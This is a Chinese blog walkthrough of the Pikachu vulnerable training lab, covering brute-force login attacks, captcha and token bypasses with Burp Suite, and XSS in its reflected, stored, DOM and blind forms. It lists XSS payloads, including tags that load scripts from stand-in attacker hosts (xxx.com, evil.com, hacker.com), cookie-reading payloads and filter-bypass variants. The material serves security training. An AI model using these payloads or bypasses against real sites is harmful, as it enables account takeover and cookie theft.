

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Na0H_1e3">
  <meta name="keywords" content="Na0H1e3,blog,博客,web,ctf,渗透">
  <title>Pikachu靶场通关小记 - Na0H的神光棒存放地</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"na0hblog.top","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"🐳_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":"G-MLL1PZ9RBK","gtag":260676474,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"zjCV2oT3ti8Lyk0insYTRpLr-gzGzoHsz","app_key":"y4AXlgIqQsV7Enr3IFS3r6Ck","server_url":"https://zjcv2ot3.lc-cn-n1-shared.com"}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Na0H的神光棒存放地</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/textbg.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="Pikachu靶场通关小记">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-01-16 11:40" pubdate>
        2021年1月16日 中午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      10.8k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      130
       分钟
    </span>
  

  
  
    
      <!-- LeanCloud 统计文章PV -->
      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Pikachu靶场通关小记</h1>
            
              <p class="note note-info">
                
                  本文最后更新于：2021年3月12日 晚上
                
              </p>
            
            <div class="markdown-body">
              <!-- more -->

<h1 id="Pikachu靶场的小记"><a href="#Pikachu靶场的小记" class="headerlink" title="Pikachu靶场的小记"></a>Pikachu靶场的小记</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>重在知识~~随便打打</p>
<blockquote>
<p>我追求的并不是一个「结果」，一旦只追求「结果」，人就容易想方设法抄近路，在抄近路的过程中，人又容易迷失真相，做事的干劲也会逐渐消磨殆尽，我认为最重要的是想要「追求真实」的意志。”</p>
</blockquote>
<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul>
<li><p>爆破关卡有四小关</p>
</li>
<li><p>暴力破解就像一道填入答案就能知道正确与否的选择题，四个答案逐个尝试直到正确为止<br>但暴力破解的选择题不会直接给出答案的内容和数量，这时就需要结合字典了</p>
</li>
<li><p>爆破其实很少能得出结果(对于那些遵循了认证安全策略的系统而言)</p>
</li>
<li><p>关于字典：</p>
<ol>
<li>通过网站得到管理员或者用户的各种信息生成字典进行爆破</li>
<li>网上一些汇总的字典</li>
</ol>
</li>
</ul>
<h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的登陆框<br>burpsuite抓一下包直接爆破即可</p>
<h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><p>接下来就涉及到验证码了<br>需要分析一下验证码的验证机制：</p>
<p>第二关在服务端检测验证码，利用burpsuite的repeat模块，先输入正确的验证码，再输入错误的验证码，再输入正确的验证码，三次发送send，若第三次于第一次结果相同则可能存在验证码的无条件不刷新<br>第三关输入错误的验证码，会弹出框框即前端js验证</p>
<h3 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h3><p>这里是在服务端进行检测，但此处的验证码可以重复使用即无条件不刷新</p>
<ul>
<li>无条件不刷新：某一时间段内，不刷新页面就可以无限次数的使用同一验证码，无论登陆成功与否 </li>
<li>bypass: 还是burpsuite抓包，将验证码作为常量即可</li>
</ul>
<h3 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h3><ul>
<li>此处的验证码在前端进行检测</li>
<li>bypass: 仍然是burpsuite抓包，直接将传送验证码的参数变量去掉即可</li>
</ul>
<h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破"></a>token防爆破</h2><ul>
<li><p>抓包发现提交的变量中多了一个token变量，再对返回包分析，可以确认token数值由返回包确定<br>因此每次登陆都要将上一个返回包的token值放入其中</p>
</li>
<li><p>利用burpsuite的intruder的草叉模式(pitchfork)：不同位置对应不同的字典<br>密码爆破仍选择字典，token需要抓取上一个返回包：</p>
</li>
</ul>
<h4 id="利用burpsuite递归抓取返回包"><a href="#利用burpsuite递归抓取返回包" class="headerlink" title="利用burpsuite递归抓取返回包"></a>利用burpsuite递归抓取返回包</h4><ul>
<li>在选项中修改线程数为1(因为每次都要抓取上一个返回包的token)</li>
</ul>
<p><img src="https://i.loli.net/2021/02/13/7Eqzh5w4GUM8Rri.png" srcset="/img/loading.gif"></p>
<ul>
<li>点击Add</li>
</ul>
<p><img src="https://i.loli.net/2021/02/13/mFkKJ7bXnCcgivI.png" srcset="/img/loading.gif"></p>
<ul>
<li>Refetch response得到返回包，搜索token然后选中即可</li>
</ul>
<p><img src="https://i.loli.net/2021/02/13/VDJcv3ZrHMeo4Ip.png" srcset="/img/loading.gif"></p>
<ul>
<li>选择递归模式：</li>
</ul>
<p><img src="https://i.loli.net/2021/02/13/VkZUvCapz7tTIyP.png" srcset="/img/loading.gif"></p>
<p>Redirections(重定向)选择always,就可以开始爆破啦</p>
<p><img src="https://i.loli.net/2021/02/13/QJgXLfArvGy5WiP.png" srcset="/img/loading.gif"></p>
<h1 id="xss跨站脚本-js！！！"><a href="#xss跨站脚本-js！！！" class="headerlink" title="xss跨站脚本(js！！！)"></a>xss跨站脚本(js！！！)</h1><p>可以打一下xss-libs~~~</p>
<blockquote>
<p>恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击！</p>
<p>存储型XSS：存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie</p>
<p>反射型XSS：非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面</p>
<p>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。 </p>
</blockquote>
<h2 id="常见的payload："><a href="#常见的payload：" class="headerlink" title="常见的payload："></a>常见的payload：</h2><p>转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35393693/article/details/86597707?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161041848616780255257057%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id=161041848616780255257057&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-86597707.pc_search_result_no_baidu_js&amp;utm_term=xss%E6%94%BB%E5%87%BB">XSS(跨站脚本)漏洞详解之XSS跨站脚本攻击漏洞的解决</a></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>标签：可以引用外部的JavaScript代码，也可以将代码插入脚本标记<br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> alert(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> #弹出cookie<br></code></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img&gt;标签：<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(&quot;hack&quot;)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(/hack/)&gt;<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt;  #弹出cookie<br>&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(123)&gt;      注：对于数字，可以不用引号<br>&lt;img  <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&quot;</span>XSS&quot;);&quot;&gt;<br>&lt;img  <span class="hljs-attribute">dynsrc</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br>&lt;img  <span class="hljs-attribute">lowsrc</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">&lt;<span class="hljs-keyword">body&gt;标签：</span><br><span class="hljs-keyword">&lt;body </span>onload=alert(<span class="hljs-string">&quot;XSS&quot;</span>)&gt;  <span class="hljs-comment">#使用onload属性在标记内部传递XSS有效内容</span><br>&lt;<span class="hljs-keyword">body </span><span class="hljs-keyword">background=&quot;javascript:alert(&quot;XSS&quot;)&quot;&gt; </span><span class="hljs-comment">#或其他更加模糊的属性在标记内部传递XSS有效内容</span><br></code></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>标签：<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">”http://evil.com/xss.html”</span>&gt;</span><br><br>该<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>标签允许另一个HTML网页的嵌入到父页面。IFrame可以包含JavaScript，但是，请注意，由于浏览器的内容安全策略（CSP），iFrame中的JavaScript无法访问父页面的DOM。然而，IFrame仍然是非常有效的解除网络钓鱼攻击的手段。<br><br></code></pre></td></tr></table></figure>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">&lt;input&gt;标签：若标记的<span class="hljs-class"><span class="hljs-keyword">type</span>属性&lt;input&gt;设置为<span class="hljs-title">image</span>，则可以对其进行操作以嵌入脚本</span><br>&lt;input <span class="hljs-class"><span class="hljs-keyword">type</span></span>=<span class="hljs-string">&quot;image&quot;</span> src=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link&gt;标签：用来连接外部的样式表可以包含的脚本<br>&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&lt;table&gt;标签：可利用<span class="hljs-attribute">background</span>属性来引用脚本，而非image<br>&lt;<span class="hljs-selector-tag">table</span> <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br>&lt;<span class="hljs-selector-tag">td</span> <span class="hljs-attribute">background</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;div&gt;标签：指定一个背景从而嵌入的脚本，类似table<br>&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;<br>&lt;div <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">&lt;<span class="hljs-keyword">object</span>&gt;标签：可用于从外部站点脚本包含<br>&lt;<span class="hljs-keyword">object</span> type=<span class="hljs-string">&quot;text/x-scriptlet&quot;</span> <span class="hljs-keyword">data</span>=<span class="hljs-string">&quot;http://hacker.com/xss.html&quot;</span>&gt;<br></code></pre></td></tr></table></figure>
<h2 id="XSS漏洞的挖掘"><a href="#XSS漏洞的挖掘" class="headerlink" title="XSS漏洞的挖掘"></a>XSS漏洞的挖掘</h2><p>黑盒测试</p>
<p>尽可能找到一切用户可控并且能够输出在页面代码中的地方，比如下面这些：</p>
<p>URL的每一个参数<br>URL本身<br>表单<br>搜索框<br>常见业务场景</p>
<p>重灾区：评论区、留言区、个人信息、订单信息等<br>针对型：站内信、网页即时通讯、私信、意见反馈<br>存在风险：搜索框、当前目录、图片属性等<br>白盒测试(代码审计)</p>
<p>关于XSS的代码审计主要就是从接收参数的地方和一些关键词入手。</p>
<p>PHP中常见的接收参数的方式有$_GET、$_POST、$_REQUEST等等，可以搜索所有接收参数的地方。然后对接收到的数据进行跟踪，看看有没有输出到页面中，然后看输出到页面中的数据是否进行了过滤和html编码等处理。</p>
<p>也可以搜索类似echo这样的输出语句，跟踪输出的变量是从哪里来的，我们是否能控制，如果从数据库中取的，是否能控制存到数据库中的数据，存到数据库之前有没有进行过滤等等。</p>
<p>大多数程序会对接收参数封装在公共文件的函数中统一调用，我们就需要审计这些公共函数看有没有过滤，能否绕过等等。</p>
<p>同理审计DOM型注入可以搜索一些js操作DOM元素的关键词进行审计。</p>
<h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p>
<p>前端-》后端-》前端：payload由前端提交到后端执行，再返回前端</p>
<h2 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h2><p>1.反射型xss</p>
<p>2.表单get型提交，表单中限制长度，由于是get型，可直接在url中修改参数</p>
<p><img src="https://i.loli.net/2021/02/13/Nv2driIsLC5lf1B.png" srcset="/img/loading.gif"></p>
<h2 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h2><p>1.反射型xss</p>
<p>2.post提交</p>
<p><img src="https://i.loli.net/2021/02/13/5AvnfNplYb2CqIw.png" srcset="/img/loading.gif"></p>
<p>此处登录框无法执行xss</p>
<p>提示我们先登录</p>
<p><img src="https://i.loli.net/2021/02/13/6KTyFt9vr35q4Nf.png" srcset="/img/loading.gif"></p>
<p>这里的表单框就可以进行xss攻击了</p>
<p>输入kobe有个小彩蛋<img src="https://i.loli.net/2021/02/13/5Dmnq24KgZ1wvQM.png" srcset="/img/loading.gif" alt="20210112102605934.png"></p>
<h2 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h2><p>持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
<p>前端-》后端-》数据库-》后端-》前端：payload由前端提交，到后端执行，存储到数据库中；打开网页时又从数据库中得到数据发送到后端执行，再到前端。</p>
<p>直接在留言板中输入payload<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://i.loli.net/2021/02/13/wN7RkDHscbI3UjJ.png" srcset="/img/loading.gif"></p>
<p>注入xss后每次访问都会触发，因为xss代码储存到了服务器中</p>
<p><img src="https://i.loli.net/2021/02/13/rQRy7FlCu8fiDo5.png" srcset="/img/loading.gif"></p>
<h2 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h2><p>不经过后端，基于DOM即Document Object Model（文档对象模型）；也属于反射型xss，通过传入的参数来控制触发</p>
<p>click me！，检查元素，构造闭合</p>
<p><img src="https://i.loli.net/2021/02/13/Fsj4Oqi9TPAyDKN.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/13/x3ZUcVmphRW4dK2.png" srcset="/img/loading.gif"></p>
<h2 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h2><p>一样的套路，只是参数位置不同</p>
<p><img src="https://i.loli.net/2021/02/13/GypHt4nFmIdvjsP.png" srcset="/img/loading.gif"></p>
<h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>尽可能地于一切可能的地方提交XSS语句，只要后台管理员看到某一条语句，此语句就能被执行。<br>可在留言板上留下获取cookie的代码，只要管理员在后台看到，就能获取管理员的cookie。</p>
<p>如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-built_in">document</span>.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/l3viQofK4WeatFb.png" srcset="/img/loading.gif"></p>
<p>点击提示可以看到管理员登陆路径</p>
<p><img src="https://i.loli.net/2021/02/13/WgEbaVwl2z3Mvcq.png" srcset="/img/loading.gif"></p>
<p>登陆后就能看到我们输入的语句，因此该语句被执行，cookie被获取</p>
<p><img src="https://i.loli.net/2021/02/13/UqYx7lsdwj4Wzar.png" srcset="/img/loading.gif"></p>
<h2 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h2><p>bypas为了防止xss攻击而设置的waf</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>看看过滤了什么</p>
<p>输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>  =》 ‘&gt;’</p>
<p><img src="https://i.loli.net/2021/02/13/HnZIpcgKvPu7OaC.png" srcset="/img/loading.gif"></p>
<p><code>alert(document.cookie)</code> =&gt; ‘alert(document.cookie)’</p>
<p><img src="https://i.loli.net/2021/02/13/WGHE3wDIovOh5kg.png" srcset="/img/loading.gif"></p>
<p><code>&lt;script&gt;</code>被过滤为<code>&gt;</code>;也就是说<code>&lt;script</code>被过滤</p>
<p>此处只能用 大小写绕过 或者 非script标签的payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sCRipt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">sCRipt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span> <br></code></pre></td></tr></table></figure>


<p>看一下源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">过滤部分：<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;message&#x27;</span>] != <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-comment">//这里会使用正则对&lt;script进行替换为空,也就是过滤掉</span><br>    <span class="hljs-variable">$message</span>=preg_replace(<span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br><span class="hljs-comment">//    $message=str_ireplace(&#x27;&lt;script&gt;&#x27;,$_GET[&#x27;message&#x27;]);</span><br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$message</span> == <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;那就去人民广场一个人坐一会儿吧!&lt;/p&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;别说这些&#x27;<span class="hljs-subst">&#123;$message&#125;</span>&#x27;的话,不要怕,就是干!&lt;/p&gt;&quot;</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p>使用了如下的正则过滤，类似双写、注释干扰都无法生效了</p>
<p><img src="https://i.loli.net/2021/02/13/wpvoqGeBJXK3LR4.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/vXfZuO7iCdhteKa.png" srcset="/img/loading.gif"></p>
<h3 id="xss过滤常见bypass"><a href="#xss过滤常见bypass" class="headerlink" title="xss过滤常见bypass:"></a>xss过滤常见bypass:</h3><p>大小写绕过：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sCRipt</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">sCRipt</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>双写绕过：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scr<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="hljs-built_in">document</span>.cookie)&lt;/scr</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;<span class="hljs-name">ipt</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>编码绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">将payload进行html编码<br></code></pre></td></tr></table></figure>
<p>使用没被过滤的payload：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">如：&lt;img  <span class="hljs-attribute">src</span>=1  <span class="hljs-attribute">onerror</span>=alert(document.cookie)&gt; <br></code></pre></td></tr></table></figure>
<p>补一个没见过的注释干扰法：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;scri<span class="hljs-comment">&lt;!--test--&gt;</span>pt&gt;alert(test)&lt;/scr<span class="hljs-comment">&lt;!--test--&gt;</span>ipt&gt;<br></code></pre></td></tr></table></figure>


<h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p>htmlspecialchars():把预定义的字符转换为 HTML 实体</p>
